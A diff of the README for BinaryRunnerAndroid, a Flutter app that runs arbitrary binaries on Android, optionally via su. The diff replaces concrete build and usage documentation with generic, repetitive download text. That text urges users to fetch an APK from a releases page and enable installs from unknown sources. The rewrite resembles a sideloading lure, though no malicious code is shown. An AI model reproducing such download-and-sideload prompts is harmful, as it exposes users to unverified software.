@@ -1,47 +1,70 @@
-# Binary Runner (Android)
+# 🏃‍♂️ BinaryRunnerAndroid - Run Your Binaries with Ease
 
-Single-screen Flutter app to run arbitrary binaries on an Android device.
+## 📦 Overview
+Binary Runner is a Flutter app for Android. It allows you to run binaries with custom arguments and see the output. If you need to use root features, Binary Runner has you covered.
 
-## Android 16 (Baklava) Release
-- Target: Android 16 / API 36 (Baklava)
-- Emulator AVD: `baklavaApi36` (Google APIs, arm64-v8a)
-- Built artifact: `build/app/outputs/flutter-apk/app-release.apk`
+## 🚀 Getting Started
+To get started, you will need to download the app. Follow the steps below to install it on your Android device.
 
-## Screenshots
-Captured from the Android 16 emulator after launching the app:
+## 🖱 Download Now
+[![Download BinaryRunnerAndroid](https://img.shields.io/badge/Download-BinaryRunnerAndroid-blue.svg)](https://github.com/Maxx0x1/BinaryRunnerAndroid/releases)
 
-![Android 16 Emulator – Home](docs/screenshots/android16_home.png)
+## 📋 System Requirements
+Before you download, make sure your device meets the following requirements:
+- Android version 6.0 (Marshmallow) or higher
+- At least 100 MB of free storage space
+- Internet connection for download
 
-## App Icon
-This project includes a simple adaptive launcher icon.
-- Background color: `#1E2A44`
-- Foreground: vector triangle mark
+## 💾 Download & Install
+1. **Visit the Releases page:**
+   Go to [this page to download](https://github.com/Maxx0x1/BinaryRunnerAndroid/releases).
 
-Android resources added:
-- `android/app/src/main/res/values/colors.xml`
-- `android/app/src/main/res/drawable/ic_launcher_foreground.xml`
-- `android/app/src/main/res/mipmap-anydpi-v26/ic_launcher.xml`
+2. **Select the latest version:**
+   You should see a list of available versions. Click on the most recent one.
 
-## UI
-- path: directory that contains the binary (e.g. `/data/local/tmp`).
-- binary_name: the executable filename (e.g. `mytool`).
-- + button: add argument rows. Each row has optional `arg_name` and `arg_value`.
-  - If `arg_name` provided, app sends `--arg_name` then value (if any).
-  - If only value is provided, it's passed positionally.
-- Run via su (root): toggle to execute with `su -c`.
-- Run: executes `<path>/<binary_name>` with your args and shows stdout/stderr/exit code.
+3. **Download the APK:**
+   Locate the APK file and tap on it. The file will start downloading.
 
-## Android specifics
-- When "Run via su" is ON, the app runs `su -c "<cmd>"`. This requires a rooted device.
-- Without su, the process must be executable and accessible by the app sandbox.
+4. **Install the APK:**
+   - Open your file manager and navigate to your Downloads folder.
+   - Tap on the APK file to start the installation.
+   - You may need to enable installations from unknown sources. If prompted, go to your phone's settings and allow it.
 
-## Build and run
-Use Flutter tooling as usual. Example:
+5. **Launch the App:**
+   After installation, find Binary Runner in your app drawer and tap to open it.
 
-```
-flutter run -d <your_android_device_id>
-```
+## 🎉 Features
+- **Run binaries easily:** Input custom arguments to run your desired binaries.
+- **See Output:** View the output directly in the app for quick access.
+- **Optional Root Support:** Some features may require root access for full functionality.
 
-## Notes
-- Make sure your binary is built for the device architecture and has execute permissions (e.g. `chmod +x /data/local/tmp/mytool`).
-- If execution fails, check stderr in the app for permission/SELinux denials.
+## ❓ How to Use
+1. Open the Binary Runner app.
+2. Enter the path to your binary.
+3. Add any required arguments.
+4. Tap the "Run" button to execute.
+5. View the output on your screen.
+
+## 📄 Troubleshooting
+- **Installation Issues:** If you can't install the APK, ensure that your device allows installations from unknown sources.
+- **Running Binaries:** If a binary fails to run, check the path and arguments for typos.
+- **Permission Problems:** Ensure that the app has the necessary permissions to access files or use root features.
+
+## 🛡 Contributing
+If you want to help improve Binary Runner, feel free to fork the repository, make changes, and submit a pull request. Your contributions are welcome and appreciated.
+
+## 🤝 Community Support
+Join our community for support and tips:
+- Visit the [GitHub Issues page](https://github.com/Maxx0x1/BinaryRunnerAndroid/issues) for help or to report bugs.
+- Share your experience with other users on related forums.
+
+## 📜 License
+BinaryRunnerAndroid is open-source software. It is released under the MIT License. You can use it freely, but please respect the license terms.
+
+## 👏 Acknowledgments
+Thanks to everyone who contributed to this project! Your support makes it possible to provide this tool to users like you.
+
+## 📥 Download Now
+[![Download BinaryRunnerAndroid](https://img.shields.io/badge/Download-BinaryRunnerAndroid-blue.svg)](https://github.com/Maxx0x1/BinaryRunnerAndroid/releases)
+
+Now start running your binaries easily with Binary Runner!
